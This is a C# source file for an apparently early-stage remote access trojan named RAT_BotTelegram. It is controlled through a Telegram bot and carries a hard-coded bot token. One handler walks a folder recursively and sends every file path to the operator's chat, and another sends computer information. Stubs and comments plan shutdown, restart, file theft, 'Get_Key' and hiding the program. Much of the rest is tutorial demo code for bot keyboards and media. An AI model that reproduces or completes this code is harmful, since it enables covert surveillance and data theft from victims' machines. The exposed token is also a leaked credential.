using RAT_BotTelegram.Lib;
using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;

namespace RAT_BotTelegram {
    class Program {
        static CommandsFeatures fea = new CommandsFeatures();
        private static readonly TelegramBotClient Bot = new TelegramBotClient("1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8");
        private static string id = "";
        static void Main(string[] args) {


            // Copiar
            // Esconder

            //Método que se ejecuta cuando se recibe un mensaje
            Bot.OnMessage += BotOnMessageReceived;

            //Método que se ejecuta cuando se recibe un callbackQuery
            Bot.OnCallbackQuery += BotOnCallbackQueryReceived;

            //Método que se ejecuta cuando se recibe un error
            Bot.OnReceiveError += BotOnReceiveError;

            // Escucha servidor
            Bot.StartReceiving();
            Bot.SendTextMessageAsync(id, "PC info??");

            Console.ReadLine();
            Console.WriteLine("La maquina se lenvantó ");
            Bot.StopReceiving();
        }

        private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
            var message = messageEventArgs.Message;

            if (message == null || message.Type != MessageType.Text) return;

            switch (message.Text.Split(' ').First()) {
                //Enviar un inline keyboard con callback
                case "/PC_Info":

                    //Simula que el bot está escribiendo
                    //await Bot.SendChatActionAsync(message.Chat.Id, ChatAction.Typing);
                    //await Task.Delay(20);

                    await Bot.SendTextMessageAsync(message.Chat.Id,"PC info??");
                    break;

                case "/GetDir_Document":

                    var keyboardEjemplo2 = new InlineKeyboardMarkup(new[]
                    {
                    new []
                    {
                        InlineKeyboardButton.WithCallbackData(
                            text:"Keyboard",
                            callbackData: "keyboard"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"Reply",
                            callbackData: "reply"),
                    },
                    new []
                    {
                        InlineKeyboardButton.WithCallbackData(
                            text:"Reenviar",
                            callbackData: "reenviar"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"Force reply",
                            callbackData: "forceReply"),
                    },
                    new []
                    {
                        InlineKeyboardButton.WithCallbackData(
                            text:"Texto con formato",
                            callbackData: "formato"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"Video",
                            callbackData: "video"),
                    }
                });

                    await Bot.SendTextMessageAsync(
                        message.Chat.Id,
                        "Elija una opción",
                        replyMarkup: keyboardEjemplo2);
                    break;

                case "/GetDir_Documentw":

                    var keyboardEjemplo3 = new InlineKeyboardMarkup(new[]
                    {
                    new []
                    {
                        InlineKeyboardButton.WithCallbackData(
                            text:"Keyboard",
                            callbackData: "keyboard"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"Reply",
                            callbackData: "reply"),
                    },
                    new []
                    {
                        InlineKeyboardButton.WithCallbackData(
                            text:"Reenviar",
                            callbackData: "reenviar"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"Force reply",
                            callbackData: "forceReply"),
                    },
                    new []
                    {
                        InlineKeyboardButton.WithCallbackData(
                            text:"Texto con formato",
                            callbackData: "formato"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"Video",
                            callbackData: "video"),
                    }
                });

                    await Bot.SendTextMessageAsync(
                        message.Chat.Id,
                        "Elija una opción",
                        replyMarkup: keyboardEjemplo3);
                    break;

                //Mensaje por default
                default:
                    const string usage = 
                  @" Use los siguientes comandos: 
                    /PC_Info      <Obtiene información de la computadora>
                    /PC_ShutDown  <Está en desarrollo>
                    /PC_Restart   <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Music    <Está en desarrollo>
                    /Get_Download <Está en desarrollo>
                    /Get_Videos   <Está en desarrollo>
                    /Get_Pictures <Está en desarrollo>
                    /Get_Desktop  <Está en desarrollo>
                    /Get_Key      <Está en desarrollo>

                    /GetDir_Document <Obtiene toda la lista>
                    /GetDir_Music    <Está en desarrollo>
                    /GetDir_Download <Está en desarrollo>
                    /GetDir_Videos   <Está en desarrollo>
                    /GetDir_Pictures <Está en desarrollo>
                    /Get_Desktop  <Está en desarrollo>
                    /Get_Key      <Está en desarrollo>

                    /Test         <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>";

                    await Bot.SendTextMessageAsync(
                        message.Chat.Id,
                        text: usage,
                        replyMarkup: new ReplyKeyboardRemove());

                    break;
            }
        }
        private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {
            var callbackQuery = callbackQueryEventArgs.CallbackQuery;

            switch (callbackQuery.Data) {
                case "keyboard":
                    ReplyKeyboardMarkup tipoContacto = new[]
                    {
                        new[] { "Opción 1", "Opción 2" },
                        new[] { "Opción 3", "Opción 4" },
                    };

                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "Keyboard personalizado",
                        replyMarkup: tipoContacto);
                    break;

                case "ubicacion":
                    await Bot.SendLocationAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        latitude: 9.932551f,
                        longitude: -84.031086f
                        );
                    break;

                case "venue":
                    await Bot.SendVenueAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        latitude: 9.932551f,
                        longitude: -84.031086f,
                        title: "Cenfotec",
                        address: "San José, Montes de Oca"
                        );
                    break;

                case "imagen":
                    await Bot.SendPhotoAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        photo: "https://www.google.co.cr/imgres?imgurl=https%3A%2F%2Fwww.pcactual.com%2Fmedio%2F2017%2F07%2F05%2Ftelegram_960x540_0aa1aeac.jpg&imgrefurl=https%3A%2F%2Fwww.pcactual.com%2Fnoticias%2Factualidad%2Fsoy-fan-telegram_13549&docid=UZhcuJ9275t8zM&tbnid=otB1G_5L3DD0sM%3A&vet=10ahUKEwjR0ouWotDiAhUiqlkKHdi6D8gQMwhLKAEwAQ..i&w=960&h=540&bih=722&biw=1536&q=telegram%20image&ved=0ahUKEwjR0ouWotDiAhUiqlkKHdi6D8gQMwhLKAEwAQ&iact=mrc&uact=8"
                        );
                    break;

                case "animation":
                    await Bot.SendAnimationAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        animation: "https://techcrunch.com/wp-content/uploads/2015/08/safe_image.gif?w=730&crop=1"
                        );
                    break;

                case "video":
                    await Bot.SendVideoAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        video: "https://res.cloudinary.com/dherrerap/video/upload/v1560039252/WhatsApp_Video_2019-06-08_at_6.10.54_PM.mp4"
                        );
                    break;

                case "document":
                    await Bot.SendDocumentAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
                        );
                    break;

                case "formato":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<b>bold</b>, <strong>bold</strong>",
                        parseMode: ParseMode.Html
                        );
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<i>italic</i>, <em>italic</em>",
                        parseMode: ParseMode.Html
                        );
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<a href='http://www.example.com/'>inline URL</a>",
                        parseMode: ParseMode.Html
                        );
                    break;

                case "reply":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "ID: " + callbackQuery.Message.MessageId + " - " + callbackQuery.Message.Text,
                        replyToMessageId: callbackQuery.Message.MessageId);
                    break;

                case "contacto":
                    await Bot.SendContactAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        phoneNumber: "2222-2222",
                        firstName: "Jane",
                        lastName: "Doe"
                        );
                    break;

                case "forceReply":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "Forzar respuesta a este mensaje",
                        replyMarkup: new ForceReplyMarkup());
                    break;

                case "reenviar":
                    await Bot.ForwardMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        fromChatId: callbackQuery.Message.Chat.Id,
                        messageId: callbackQuery.Message.MessageId
                        );
                    break;
            }
        }
        private static void BotOnReceiveError(object sender, ReceiveErrorEventArgs receiveErrorEventArgs) {
            Console.WriteLine("Received error: {0} — {1}",
                receiveErrorEventArgs.ApiRequestException.ErrorCode,
                receiveErrorEventArgs.ApiRequestException.Message);
        }
        private static void Bot_OnMessagesdsd(object sender, Telegram.Bot.Args.MessageEventArgs e) {

            if (e.Message.Type == Telegram.Bot.Types.Enums.MessageType.Text) {

                if (e.Message.Text == "/PC_Info") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, fea.PC_Info());
                } else if (e.Message.Text == "/PC_ShutDown") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/PC_Restart") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");

                } else if (e.Message.Text == "/Get_Document") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Music") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Download") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Videos") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Pictures") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Desktop") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");


                } else if (e.Message.Text == "/GetDir_Document") {
                    /*
                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0064.mp4
                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0081.mp4
                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0082.mp4
                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0083.mp4
                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0099.mp4
                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0102.mp4
                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0103.mp4

                    */


                    //string[] allfiles = fea.GetFile(@"O:\OneDrive - xKx\Pictures")
                    string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
                    //string[] authorsList = authors.Split(", ")
                    foreach (var file in allfiles) {
                        FileInfo info = new FileInfo(file);
                        Console.WriteLine("File: " + info);
                        Bot.SendTextMessageAsync(e.Message.Chat.Id, "" + info);
                        // Bot.SendDocumentAsync(e.Message.Document.);
                        // Do something with the Folder or just add them to a list via nameoflist.add();

                    }

                    //Bot.SendTextMessageAsync(e.Message.Chat.Id, string[] authorsList = authors.Split(", "));
                } else if (e.Message.Text == "/GetDir_Music") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/GetDir_Download") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/GetDir_Videos") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/GetDir_Pictures") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/GetDir_Desktop") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");


                } else if (e.Message.Text == "/Get_Key") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Test") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/elseif") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/3") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, @" Use los siguientes comandos: 
                    /PC_Info      <Obtiene información de la computadora>
                    /PC_ShutDown  <Está en desarrollo>
                    /PC_Restart   <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Music    <Está en desarrollo>
                    /Get_Download <Está en desarrollo>
                    /Get_Videos   <Está en desarrollo>
                    /Get_Pictures <Está en desarrollo>
                    /Get_Desktop  <Está en desarrollo>
                    /Get_Key      <Está en desarrollo>

                    /GetDir_Document <Obtiene toda la lista>
                    /GetDir_Music    <Está en desarrollo>
                    /GetDir_Download <Está en desarrollo>
                    /GetDir_Videos   <Está en desarrollo>
                    /GetDir_Pictures <Está en desarrollo>
                    /Get_Desktop  <Está en desarrollo>
                    /Get_Key      <Está en desarrollo>

                    /Test         <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    ");
                }




            }

        }
    }
}
